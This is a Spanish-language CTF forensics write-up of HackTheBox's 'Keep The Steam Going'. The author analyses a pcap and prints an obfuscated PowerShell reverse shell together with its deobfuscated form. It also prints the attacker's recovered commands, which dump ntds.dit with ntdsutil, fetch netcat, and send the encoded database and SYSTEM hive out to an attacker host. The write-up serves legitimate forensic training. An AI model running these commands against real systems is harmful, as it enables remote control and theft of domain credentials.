---
title: Keep The Steam Going
description: >
  HackTheBox Forensics Challenge - Hard<br>
  [Challenge Download](https://app.hackthebox.com/challenges/279)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","hard", "deobfuscation", "wireshark"]
---

---
# Enunciado del problema

The network in which our main source of steam is connected to, got compromised. If they managed to gain full control of this network, it would be a disaster!

---
# Resolución

Nos da un pcap donde sacamos 6 archivos, uno encriptado, un binario, dos powershell scripts y otros dos html.

Abriendo el primer **html** nos aparece el siguiente código en base64:

```powershell
PS C:\Users\yoshl\Documents\Retos\KTSG> cat .\test.html

<html>
    <head>
        <title>Hello World!</title>
    </head>
    <body>
        <p>Hello World!</p>
        // Hello World! eyJHVUlEIjoiMWRhZWM3Y2FlNiIsIlR5cGUiOjEsIk1ldGEiOiIiLCJJViI6IkVNZ0x5UXBsdkd2UDFrNEZFbmN3c2c9PSIsIkVuY3J5cHRlZE1lc3NhZ2UiOiJJV3BaTTBlMFFvSnRadENhS1VrbUZpYmMyZUsydHFhYnJSRXlvdFNRR2pGMU11bHp1aE0vbEp4dVppeEQxazlvNXhGL1hMNTNzdXJoYlZXVFFXaTJpbVdZS0tRelFyTy9WTG5zQmk3anBEeVpjTk4xL1dMdWRLeTRVSHJnUmVIRFpvVDdvRUlmNTNoTUxCZ1Y1V0Y2cGgxbHJ0Z1FzSUprOEdHTG8vZzNHRlVRUnNjaS9jV1FOWHJRSTQ5WFlQM3hnMkkyRnVOcFpaRVhWMlZFQkZoYVVwd2Ira1VGV1MzbVh2cW1xcld2d0ROQXBPOEhlR1J1ZFJYZlVEcHJCejdVZzRLNmVtWHA3ZzJDM3NxMSt2NG1tbUpxaExnYlMvM1E3eWhDOTFwZWRHUzFCVDA3YXQ4Mnhrbk9sN1hLYUNrZ0lSbm5kRDhVRGUxWlNERktwYXAvTHRtVHV3dVNUamIvbVpKS3pwU3ZyYW89IiwiSE1BQyI6IjZ6dUFiaHJTZDk4d0tnZ3RyWWdOR0QxbEpaNHVhNkNaUDFmZHNMdUh0c0k9In0=
    </body>
</html>
```

Desencriptado nos aparece una respuesta json:

```json
{
"GUID":"1daec7cae6",
"Type":1,
"Meta":"",
"IV":"EMgLyQplvGvP1k4FEncwsg==",
"EncryptedMessage":"IWpZM0e0QoJtZtCaKUkmFibc2eK2tqabrREyotSQGjF1MulzuhM/lJxuZixD1k9o5xF/XL53surhbVWTQWi2imWYKKQzQrO/VLnsBi7jpDyZcNN1/WLudKy4UHrgReHDZoT7oEIf53hMLBgV5WF6ph1lrtgQsIJk8GGLo/g3GFUQRsci/cWQNXrQI49XYP3xg2I2FuNpZZEXV2VEBFhaUpwb+kUFWS3mXvqmqrWvwDNApO8HeGRudRXfUDprBz7Ug4K6emXp7g2C3sq1+v4mmmJqhLgbS/3Q7yhC91pedGS1BT07at82xknOl7XKaCkgIRnndD8UDe1ZSDFKpap/LtmTuwuSTjb/mZJKzpSvrao=",
"HMAC":"6zuAbhrSd98wKggtrYgNGD1lJZ4ua6CZP1fdsLuHtsI="
}
```

Dejando eso de lado, el binario: *n.exe* que es el *net-cat*:

```bash
$> strings -n10 n.exe | grep -E "netcat|nc"
 
nc -h for help
[v1.12 NT http://eternallybored.org/misc/netcat/]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [options] [hostname] [port]
port numbers can be individual or ranges: m-n [inclusive]
```

Y empezamos a deobfuscar un archivo powershell:

```powershell
sv ('8mxc'+'p')  ([tyPe]("{1}{0}{2}" -f 't.encOdi','tex','nG') ) ;${ClI`E`Nt} = &("{1}{0}{2}"-f 'je','New-Ob','ct') ("{5}{0}{8}{1}{2}{3}{4}{6}{7}" -f'y','m','.Net.So','ckets.T','C','S','PC','lient','ste')(("{0}{1}{2}" -f '192.168','.1','.9'),4443);${sT`Re`Am} = ${C`L`IeNT}.("{0}{2}{1}"-f'Ge','tream','tS').Invoke();[byte[]]${By`T`es} = 0..65535|.('%'){0};while((${i} = ${str`EaM}.("{0}{1}" -f'Re','ad').Invoke(${bY`Tes}, 0, ${by`TEs}."Len`G`TH")) -ne 0){;${d`AtA} = (.("{2}{1}{0}"-f '-Object','w','Ne') -TypeName ("{0}{3}{5}{1}{4}{2}" -f'Syst','ASCI','g','em.Text','IEncodin','.'))."gETSt`R`i`Ng"(${by`TES},0, ${i});${SeN`DBacK} = (.("{0}{1}"-f 'ie','x') ${Da`Ta} 2>&1 | &("{0}{2}{1}"-f'Out-','ing','Str') );${SENdb`AC`k2} = ${s`eNDb`ACK} + "PS " + (.("{1}{0}"-f'd','pw'))."P`ATH" + "> ";${sE`NDBYtE} = (  (  vaRIaBle ('8MXC'+'P')  -ValUe  )::"ASC`Ii").("{2}{1}{0}"-f'es','tByt','Ge').Invoke(${SENdB`AC`K2});${sT`REAM}.("{0}{1}" -f'Writ','e').Invoke(${S`e`NdbY`Te},0,${SE`NDbyTe}."lENG`TH");${S`TR`eAM}.("{1}{0}" -f 'h','Flus').Invoke()};${clIE`Nt}.("{0}{1}"-f 'Cl','ose').Invoke()
```

```powershell
sv ('8mxcp') ([type]('text.encoding'));

${client} = &('New-Object') ('System.Net.Sockets.TCPClient')('192.168.1.9',4443);
${stream} = ${client}.('GetStream').Invoke();
[byte[]]${bytes} = 0..65535|.('%'){0};

while((${i} = ${stream}.('Read').Invoke(${bytes}, 0, ${bytes}."Length")) -ne 0){
    ${data} = (.('New-Object') -TypeName ('System.Text.ASCIIEncoding'))."GetString"(${bytes},0, ${i});
    ${sendback2} = (.('iex') ${data} 2>&1 | &('Out-String') );
    ${sendback2} = ${sendback} + "PS " + (.('pwd'))."PATH > ";
    ${sendbyte} = (( variable ('8MXCP')  -ValUe  )::"ASCII").('GetByte').Invoke(${sendback2});
    ${stream}.('Write').Invoke(${sendbyte},0,${sendbyte}."lenght");
    ${stream}.('Flush').Invoke()

};

${client}.('Close').Invoke()
```

Investigando más en el pcap, porque no podemos hacer nada ya que necesitamos la clave AES y solo tenemos *IV*, nos damos cuenta que hay una reverse shell usada con *n.exe*, en: `tcp.stream eq 21`.

Lo que nos importa son los paquetres: `192.168.1.9:4443 -> 192.168.1.10:49745`, siendo los comando ejecutados por el atacante:

```bash
whoami;hostname

ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
iex (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.9/n.exe","C:\Users\Public\Music\n.exe")
certutil -encode "C:\temp\Active Directory\ntds.dit" "C:\temp\ntds.b64"
certutil -encode "C:\temp\REGISTRY\SYSTEM" "C:\temp\system.b64"
cat C:\temp\ntds.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
cat C:\temp\system.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
```

Y en el stream 23 encontramos con el certificado *ntds*:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240515164732.png)

Teniendo esta información buscamos herramientas que nos ayuden a desencriptar paquetes **NTLM** que encontramos en wireshark:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240515165107.png)

Encontramos este programa en python que nos ayuda a desencriptar las **application/http-spnego-session-encrypted** en *NTLM* llamado: **WinRM** -> https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045

Para afirmar también vemos que usan la misma herramienta en el *User Agent*:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240515170158.png)

Entonces obtenemos el hash del administrador, y usamos la herramienta:

```powershell
PS C:\Users\yoshl\Documents\Retos\KTSG> python .\winrm.py -n "8bb1f8635e5708eb95aedf142054fc95" .\forensics_keep_the_steam\capture.pcap > decrypted.txt

PS C:\Users\yoshl\Documents\Retos\KTSG> Dir .\decrypted.txt

    Directory: C:\Users\yoshl\Documents\Retos\KTSG

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           5/15/2024  5:02 PM         236753 decrypted.txt
```

Dentro del archivo hay más trafico, con contenido en base64, en una de las peticiones, nos encontraremos con la flag:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240515170515.png)

